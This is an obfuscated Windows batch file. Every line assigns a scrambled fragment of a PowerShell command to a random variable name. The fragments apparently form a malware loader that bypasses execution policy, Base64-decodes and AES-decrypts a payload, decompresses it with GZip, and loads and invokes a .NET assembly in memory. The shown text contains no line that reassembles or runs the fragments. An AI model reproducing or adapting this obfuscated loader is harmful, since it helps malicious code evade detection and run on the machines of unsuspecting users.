@echo off
set "DtUlPKOpWv=..-1"
set "VXgJaxMclL= = N"
set "vzmeGMRkmb=fUZK"
set "nyMqpovbrg=Z.Su"
set "WZpKwWkZuD=urit"
set "tufmDLMmDO=-Obj"
set "DoUmIKUFVI=O.Me"
set "WIysUrDNWp=raph"
set "tyIWVfdpUC=em.C"
set "DWUiYzsTmG=oZtQ"
set "JDhfvxhBqt=y.Pa"
set "QRvkSPYVFb=gsYZ"
set "dVISsYNEUP=B.Pa"
set "uTrcMdreSf=::De"
set "uNZCDZvXAS=saBm"
set "fsbtCRatxp=s75K"
set "iaIaSWsZuZ=J = "
set "TvHWvmcztd=.-16"
set "DMPPJGdoJN=y.Ci"
set "xNSGhPzGjb=);$o"
set "dgZLavTjTk=ing("
set "PnfeTPXeKX=tem."
set "YxscuZwPZh=PxEW"
set "aFdlxbONnn=();$"
set "eDkPjXAjfF=rans"
set "BdZisSYSGE=New-"
set "ezGuiyNQjR=dj0C"
set "DrUNEHqDCj=CFxo"
set "fafOuiPOik=ach "
set "mCxQrACdjm=]::N"
set "pjacGFjSdB=106u"
set "nqKvzPhIIq=-joi"
set "JokBjtJsNq=ck($"
set "dSJvWKjOOl=16] "
set "VviwvcfVCu=UZKB"
set "zhFsKzRMRt=Disp"
set "IVkhfGqBIw=raph"
set "uligRJpCdG=; };"
set "TnwfkAdigv=.Dis"
set "srjBJCMpTp=ateD"
set "ppPlwtbieo= [Sy"
set "NNBoGFEOla=bypa"
set "rquRQNjgoJ=ode]"
set "sPWVqKqxpP== $f"
set "VozSYFlIeI=.IO."
set "EFeNQXIHck=Epc."
set "aqSRJyGQIz=ne);"
set "MbLgDdpiHi=6] -"
set "qlPjBFqwTP=sion"
set "oYXVtAsHcL=ypto"
set "ILCRFsRKRW=d;$f"
set "grCuxGPliW=[Sys"
set "RiZbSHlQSm=embl"
set "iFbzLFTTYq=)) {"
set "sxaEJjANMA=bjec"
set "aYqdhvXDOH=$WwG"
set "afObFXSfuP=form"
set "HhpVASXVGi=zuZI"
set "DVuLAGSNEF=[]] "
set "rwvEsCqtPM=oL'["
set "wdhsWQvcYT=ert]"
set "lyDgyXozuA=ke($"
set "YbsCzwOeYl=Bmor"
set "wmDSyGoSiF=('da"
set "ltpxCXcuqV=esMa"
set "JWVXUvNodu=YxVw"
set "PqYoWEdtpf=wGrJ"
set "IvekQnrYIV=daeR"
set "uhYDQCKagL=1] -"
set "yxtsoBIICE=pc.T"
set "xpueglYpHd=.GZi"
set "vKHlbvLnKk=null"
set "yAlxrhUCQR=stem"
set "cEHHLWPNmG=.Ass"
set "OSIViwKBkZ=RmAx"
set "kMYsUZkRto=Syst"
set "ngrsygKqYS=();$"
set "gPrqkxXCZQ=.Sec"
set "oIekManZqV=th('"
set "VDpVOoNWgi=File"
set "OODRsSGKNT=.Cop"
set "rAZGPjnZzV=yste"
set "WVhmexbwTr=hy.A"
set "pspZBCZTdx=ment"
set "tOIEheTzVR=Star"
set "BcunzgTNCw=oin "
set "soXXWiYzCZ=eMVs"
set "DNpMxLyXsS=.Cry"
set "ZtVFKhssWN='[-1"
set "VctIQlCwiY=);$f"
set "NIcIcaRIes=('Tg"
set "RaHpTcLbZU=1..-"
set "piUuavMetv=vert"
set "oPOXDoufJT=$oNE"
set "uqzlxDckGV=gth)"
set "xfXUJAQxRj=e = "
set "YmaVbivumQ=:('g"
set "isguhdeODq=lBlo"
set "WYtGxvrltc=stem"
set "tfJCPIdpab=iron"
set "PRUECHDiGR=Mode"
set "TKJVsMlYFf=rJ);"
set "tpUhEtYpin=innX"
set "OgJsbQgxui=join"
set "CMVmsEthIJ=rJ ="
set "auKRwzkAav=grap"
set "vYreJDYuDw=comp"
set "xQjfRtZyJL=.Mod"
set "hdMLyNgGnk=PKCS"
set "OOFtkpRrCy=-nop"
set "MFiFkbeXrl=($Uk"
set "dbBlYLnNhc=ct S"
set "lWATBhkIlk=flec"
set "VeVtiNLErJ=gMod"
set "GeqhVdrWyp= = ["
set "bDPHwdaqdX='[-1"
set "nFmsGzTgnG=brea"
set "AzRKyHdtmZ=oArr"
set "gtqaSHSMyH=ZNZ."
set "zQJqaTEBiQ=..-1"
set "JVuneXXEyg=:: '"
set "JGrAUNLARa=em.I"
set "dKzHgaKeLl=New-"
set "GtnkyiyPKw=n ''"
set "gNjTmjJyUo=)))"
set "XVbBtojfWx=Invo"
set "mwSBaHmbLy=onve"
set "uVfQmSvNfg=esaB"
set "ssInUGEGkL=-joi"
set "PXarBADQqX=pStr"
set "BYYDAleYgi=se()"
set "ILufWJTsCu=();$"
set "GnncBVLVQv=l5E7"
set "veMVAJBzJa=gjYA"
set "TeBdfkRITe=, $W"
set "NWWJTBBfjM=oryS"
set "AVSpfYjRFM=Stre"
set "XjQDuNFBUB=wGrJ"
set "QzuTlgBtOq=nX.D"
set "WBSEkwOjqs=c = "
